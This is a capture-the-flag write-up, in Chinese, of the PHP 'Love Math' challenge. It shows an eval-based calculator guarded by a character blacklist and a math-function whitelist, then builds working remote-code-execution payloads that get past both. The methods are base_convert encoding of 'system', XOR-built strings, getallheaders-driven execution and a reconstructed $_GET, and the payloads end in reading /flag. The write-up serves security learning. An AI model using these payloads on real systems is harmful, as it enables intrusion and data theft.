## Love Math

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

利用数学函数构造eval可以执行的webshell进而读取flag,有一点像无参数RCE

数学函数中有一个特殊函数为`base_convert`

`base_convert ( string $number , int $frombase , int $tobase ) : string`

>返回一**字符串**,包含`number`以`tobase`进制的表示,`number`本身的进制由`frombase`指定,`frombase`和`tobase`都只能在2和36之间(包括2和36),高于十进制的数字用字母`a-z`表示 

`base_convert(1751504350,10,36)`得到`system`

`base_convert(784,10,36)`得到`ls`

`base_convert(724009,10,36)`得到`find`

`system('ls')`的payload为`?c=base_convert(1751504350,10,36)(base_convert(784,10,36))`

`system('find')`的payload为`?c=base_convert(1751504350,10,36)(base_convert(724009,10,36))`

但是buuoj复现的题目的flag并不在www目录下,尝试对根目录进行搜索,因此需要对` /`进行构造

> 在php中可以对字符串进行异或,同时php中的函数名使用字符串来表示

```php
var_dump(urlencode("asdf"^"qwer"));
var_dump(urlencode("asdf"^"qwer0"));
/*
string(12) "%10%04%01%14"
string(12) "%10%04%01%14"
*/
```

```php
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($i=0;$i<count($whitelist);++$i){
    for($j=0;$j<count($whitelist);++$j){
        for($k=0;$k<0xff;++$k){
            $s=$whitelist[$i]^$whitelist[$j]^dechex($k);
            if($s==' /'){
                var_dump($whitelist[$i]);
                var_dump($whitelist[$j]);
                var_dump($k);
            }
        }
    }
}
```

` /`的payload为`asin^pi^dechex(21)`

`system('ls /')`的payload为`?c=base_convert(1751504350,10,36)(base_convert(784,10,36).(asin^pi^dechex(21)))`,可以对payload进行缩短`?c=($pi=base_convert)(1751504350,10,36)($pi(784,10,36).(asin^pi^dechex(21)))`

得到flag在根目录下为`/flag`

在无参数RCE中有一个函数为`getallheaders`,构造`system(getallheaders(){xxx})`的payload即可执行任意代码,但是在php中直接`base_convert("getallheaders",36,10)`会出问题,因此使用`base_convert("getallheaders",30,10)`代替

```php
<?php
var_dump(base_convert(base_convert("getallheaders",36,10),10,36));
//string(13) "getallheadc08"
var_dump(base_convert(base_convert("getallheaders",30,10),10,30));//8768397090111664438
//string(13) "getallheaders"
```

payload为`?c=($pi=base_convert)(1751504350,10,36)($pi(8768397090111664438,10,30)(){1})`

添加header为`1 => ls`,即可执行`system('ls')`

![image-20210424140339386](image-20210424140339386.png)

![image-20210424140401445](image-20210424140401445.png)

---

> 特殊技巧

1. 除了使用`cat`命令读取文件外,使用`nl`命令也可以进行读取文件

2. `cat /*`的16进制为`636174202f2a`,`echo hex2bin('636174202f2a');`可以得到`cat /*`

3. 构造`$_GET`来手动传入参数

`'1517'^'nrtc'=='_GET'`

payload`?c=$pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);${$pi}{0}(${$pi}{1})&0=system&1=cat /flag`

![image-20210424142210869](image-20210424142210869.png)